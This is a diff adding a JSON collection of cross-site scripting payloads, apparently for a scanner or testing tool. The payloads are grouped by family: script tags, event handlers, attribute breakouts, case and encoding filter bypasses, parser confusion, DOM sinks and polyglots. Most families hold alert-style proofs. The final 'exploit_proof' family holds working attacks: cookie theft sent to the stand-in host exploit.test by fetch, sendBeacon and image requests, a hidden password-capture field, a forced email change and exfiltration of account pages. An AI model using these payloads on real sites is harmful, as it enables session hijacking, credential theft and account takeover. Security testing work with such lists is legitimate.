@@ -1,0 +1,253 @@
+{
+    "payload_families": {
+        "basic_script": {
+            "description": "Basic script tag injection",
+            "payloads": [
+                "<script>alert(document.cookie)</script>",
+                "<script>alert(document.domain)</script>",
+                "<script>alert(document.location)</script>",
+                "<script>alert(1)</script>",
+                "<script>alert('XSS')</script>",
+                "<script>alert(String.fromCharCode(88,83,83))</script>",
+                "<script>confirm(1)</script>",
+                "<script>prompt(1)</script>",
+                "<script>alert(/XSS/)</script>",
+                "<script>window.alert(1)</script>",
+                "<script>eval('alert(1)')</script>",
+                "<script>setTimeout('alert(1)',0)</script>",
+                "<script>globalThis[`ale`+`rt`](1)</script>",
+                "<script>window['al\\u0065rt'](1)</script>",
+                "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x281\\x29')</script>",
+                "<script>setTimeout`alert\\x281\\x29`</script>",
+                "<script>(function(){alert(1)})()</script>"
+            ]
+        },
+        "img_onerror": {
+            "description": "Image tag with error handler",
+            "payloads": [
+                "<img src=x onerror=alert(document.cookie)>",
+                "<img src=x onerror=alert(document.domain)>",
+                "<img/src=x/onerror=alert(document.cookie)>",
+                "<img src=x onerror=alert(1)>",
+                "<img src=x onerror='alert(1)'>",
+                "<img/src=x onerror=alert(1)>",
+                "<img src onerror=alert(1)>",
+                "<img src=1 onerror=confirm(1)>",
+                "<img src=x onerror=prompt(1)>",
+                "<img src=x onerror=eval('alert(1)')>",
+                "<img src=x onerror=window.alert(1)>",
+                "<IMG SRC=x ONERROR=\"alert(1)\">",
+                "<img src=x onerror=alert`1`>",
+                "<img\tsrc=x\tonerror=alert(1)>",
+                "<img src=x onerror=alert&#40;1&#41;>",
+                "<img src=x onerror=\"&#97;lert(1)\">",
+                "<img src=x onerror=String.fromCharCode(97,108,101,114,116)(1)>",
+                "<audio src=x onerror=alert(1)>",
+                "<audio onloadstart=alert(1) src=x>",
+                "<video src=x onerror=alert(1)>",
+                "<video><source onerror=alert(1)>",
+                "<source src=x onerror=alert(1)>",
+                "<track src=/ onerror=alert(1)>",
+                "<embed src=x onerror=alert(1) type=image/gif>",
+                "<iframe src=x onerror=alert(1)>"
+            ]
+        },
+        "svg_onload": {
+            "description": "SVG tag with onload handler",
+            "payloads": [
+                "<svg onload=alert(document.cookie)>",
+                "<svg onload=alert(document.domain)>",
+                "<svg onload=alert(1)>",
+                "<svg/onload=alert(1)>",
+                "<svg onload='alert(1)'>",
+                "<svg onload=confirm(1)>",
+                "<svg><script>alert(1)</script></svg>",
+                "<svg onload=eval(atob('YWxlcnQoMSk='))>",
+                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+                "<svg><animatetransform onbegin=alert(1) attributeName=transform>",
+                "<svg/onload=prompt(1)>",
+                "<svg onload=alert&#40;1&#41;>",
+                "<svg onload=eval(`al`+`ert(1)`)>",
+                "<svg><animate attributeName=href values=javascript:alert(1) begin=0>",
+                "<svg onload=top.alert(1)>",
+                "<svg/onload=window['alert'](1)>"
+            ]
+        },
+        "event_handler": {
+            "description": "Various HTML event handlers",
+            "payloads": [
+                "<body onload=alert(document.cookie)>",
+                "<input onfocus=alert(document.cookie) autofocus>",
+                "<details open ontoggle=alert(document.domain)>",
+                "<body onload=alert(1)>",
+                "<input onfocus=alert(1) autofocus>",
+                "<marquee onstart=alert(1)>",
+                "<details open ontoggle=alert(1)>",
+                "<video><source onerror=alert(1)>",
+                "<div onmouseover=alert(1)>hover</div>",
+                "<a onclick=alert(1) href=#>click</a>",
+                "<select onfocus=alert(1) autofocus>",
+                "<textarea onfocus=alert(1) autofocus>",
+                "<button onclick=alert(1)>btn</button>",
+                "<p onmouseover=alert(1)>hover</p>",
+                "<form onsubmit=alert(1)><input type=submit></form>",
+                "<input onkeyup=alert(1) autofocus>",
+                "<audio onloadstart=alert(1) src=x>",
+                "<input autofocus onfocus=alert(1)>",
+                "<select autofocus onfocus=alert(1)>",
+                "<textarea autofocus onfocus=alert(1)>",
+                "<keygen autofocus onfocus=alert(1)>",
+                "<meter value=2 min=0 max=10 onmouseover=alert(1)>2</meter>",
+                "<form><button formaction=javascript:alert(1)>XSS</button></form>",
+                "<object data=javascript:alert(1)>"
+            ]
+        },
+        "attribute_escape": {
+            "description": "Breaking out of HTML attributes",
+            "payloads": [
+                "\"><script>alert(document.cookie)</script>",
+                "\"><img src=x onerror=alert(document.cookie)>",
+                "\"><svg onload=alert(document.domain)>",
+                "\"><script>alert(1)</script>",
+                "'><script>alert(1)</script>",
+                "\"><img src=x onerror=alert(1)>",
+                "' onfocus='alert(1)' autofocus='",
+                "\" onfocus=\"alert(1)\" autofocus=\"",
+                "\" onmouseover=\"alert(1)\"",
+                "' onmouseover='alert(1)'",
+                "\"><svg onload=alert(1)>",
+                "\"><details open ontoggle=alert(1)>",
+                "';alert(1)//",
+                "\";alert(1)//",
+                "` onerror=alert(1) `",
+                "\\'><script>alert(1)</script>",
+                "\" autofocus onfocus=alert(1) x=\"",
+                "' autofocus onfocus=alert(1) x='",
+                "\"><script>/*\n*/alert(1)</script>",
+                "\" style=\"animation-name:slidein\" onanimationstart=\"alert(1)\""
+            ]
+        },
+        "case_bypass": {
+            "description": "Case variation to bypass filters",
+            "payloads": [
+                "<ScRiPt>alert(document.cookie)</ScRiPt>",
+                "<sVg/OnLoAd=alert(document.cookie)>",
+                "<ScRiPt>alert(document.domain)</ScRiPt>",
+                "<ScRiPt>alert(1)</ScRiPt>",
+                "<SCRIPT>alert(1)</SCRIPT>",
+                "<scRipt>alert(1)</scRipt>",
+                "<IMG SRC=x ONERROR=alert(1)>",
+                "<sVg OnLoAd=alert(1)>",
+                "<IMG/SRC=x/ONERROR=alert(1)>",
+                "<Details Open OnToggle=alert(1)>",
+                "<Input OnFocus=alert(1) Autofocus>",
+                "<BODY ONLOAD=alert(1)>",
+                "<iMg sRc=x oNeRrOr=alert(1)>",
+                "<sCrIpT/SrC=x oNeRrOr=alert(1)></sCrIpT>",
+                "<ScRipT>window.onerror=alert;throw 1</ScRipT>",
+                "<iNpUt aUtOfOcUs oNfOcUs=alert(1)>",
+                "<DeTaIlS oPeN oNtOgGlE=alert(1)>"
+            ]
+        },
+        "encoding_bypass": {
+            "description": "Encoding-based filter evasion",
+            "payloads": [
+                "<script>alert(document.cookie)</script>",
+                "<script>\\u0061lert(document.domain)</script>",
+                "<script>\\u0061lert(1)</script>",
+                "<img src=x onerror=&#97;lert(1)>",
+                "<a href=javascript:alert(1)>click</a>",
+                "<script>&#x61;&#x6C;&#x65;&#x72;&#x74;(1)</script>",
+                "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
+                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+                "<a href=javascript&colon;alert(1)>click</a>",
+                "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
+                "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+                "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">click</a>",
+                "<script>\\u{61}lert(1)</script>",
+                "<img src=x onerror=window['\\u0061lert'](1)>",
+                "<script>eval('\\x61lert\\x281\\x29')</script>",
+                "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
+            ]
+        },
+        "nested_tags": {
+            "description": "Nested/broken tags to confuse parsers",
+            "payloads": [
+                "</script><script>alert(document.cookie)</script>",
+                "</textarea><script>alert(document.cookie)</script>",
+                "<<script>alert(1)//<</script>",
+                "<scr<script>ipt>alert(1)</scr</script>ipt>",
+                "<iframe src=\"javascript:alert(1)\">",
+                "<object data=\"javascript:alert(1)\">",
+                "</script><script>alert(1)</script>",
+                "<script>/*</script><script>*/alert(1)//</script>",
+                "--><script>alert(1)</script>",
+                "<img src=x onerror=\"al\"+\"ert(1)\">",
+                "<iframe onload=alert(1)>",
+                "<script>alert(1)//",
+                "]]><script>alert(1)</script>",
+                "<!--<img src=--><img src=x onerror=alert(1)>",
+                "<isindex type=image src=1 onerror=alert(1)>",
+                "</textarea><script>alert(1)</script>",
+                "</title><script>alert(1)</script>",
+                "</style><script>alert(1)</script>"
+            ]
+        },
+        "dom_based": {
+            "description": "DOM-based XSS vectors",
+            "payloads": [
+                "<img src=1 onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
+                "<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>",
+                "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
+                "<svg onload=eval(atob('YWxlcnQoMSk='))>",
+                "<img src=1 onerror=setTimeout('alert(1)',0)>",
+                "<svg onload=Function('alert(1)')()>",
+                "<img src=x onerror=window['al'+'ert'](1)>",
+                "<svg onload=top['al'+'ert'](1)>",
+                "<img src=x onerror=(0,eval)('alert(1)')>",
+                "<img src=x onerror=this.constructor.constructor('alert(1)')()>",
+                "<img src=x onerror=[].constructor.constructor('alert(1)')()>",
+                "<img src=x onerror=location='javascript:alert(1)'>",
+                "<img src=x onerror=(new Function('alert(1)'))()>",
+                "<img src=x onerror=Reflect.apply(alert,null,[1])>",
+                "<svg onload=Object.constructor.constructor('alert(1)')()>",
+                "<img src=x onerror=window.onerror=alert;throw 1>"
+            ]
+        },
+        "polyglot": {
+            "description": "Multi-context polyglot payloads",
+            "payloads": [
+                "'\"><img src=x onerror=alert(document.cookie)//>",
+                "'\"><svg onload=alert(document.domain)//",
+                "\"><img src=x onerror=alert(document.cookie)//>",
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+                "'\"><img src=x onerror=alert(1)//>",
+                "--><script>alert(1)</script>",
+                "</script><script>alert(1)</script>",
+                "<img src=x:alert(alt) onerror=eval(src) alt=1>",
+                "\"><svg/onload=alert(1)//",
+                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";",
+                ";'\">()</option></select></textarea><ScRiPt>alert(1)</ScRiPt>",
+                "--></style></script><details open ontoggle=alert(1)>",
+                "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+            ]
+        },
+        "exploit_proof": {
+            "description": "High-impact proof-of-exploit payloads: cookie theft, password capture, CSRF bypass",
+            "payloads": [
+                "<script>alert(document.cookie)</script>",
+                "<script>alert(document.domain)</script>",
+                "<script>fetch('https://exploit.test/steal?c='+document.cookie)</script>",
+                "<script>document.location='https://exploit.test/steal?c='+document.cookie</script>",
+                "<script>new Image().src='https://exploit.test/steal?c='+document.cookie</script>",
+                "<script>navigator.sendBeacon('https://exploit.test/steal',document.cookie)</script>",
+                "<input type=hidden name=csrf><script>fetch('/my-account').then(r=>r.text()).then(t=>{var d=new DOMParser().parseFromString(t,'text/html');alert('CSRF token: '+d.querySelector('input[name=csrf]').value)})</script>",
+                "<script>var f=document.createElement('form');f.method='POST';f.action='/my-account/change-email';var e=document.createElement('input');e.name='email';e.value='attacker@evil.test';f.appendChild(e);document.body.appendChild(f);f.submit()</script>",
+                "<script>var i=document.createElement('input');i.type='password';i.name='password';i.style='opacity:0;position:absolute';document.body.appendChild(i);setTimeout(function(){if(i.value)fetch('https://exploit.test/pw?p='+i.value)},3000)</script>",
+                "<script>fetch('/my-account').then(r=>r.text()).then(t=>fetch('https://exploit.test/exfil',{method:'POST',body:t}))</script>",
+                "<img src=x onerror=\"fetch('https://exploit.test/?c='+document.cookie)\">",
+                "<svg onload=\"fetch('https://exploit.test/?c='+document.cookie)\">"
+            ]
+        }
+    }
+}
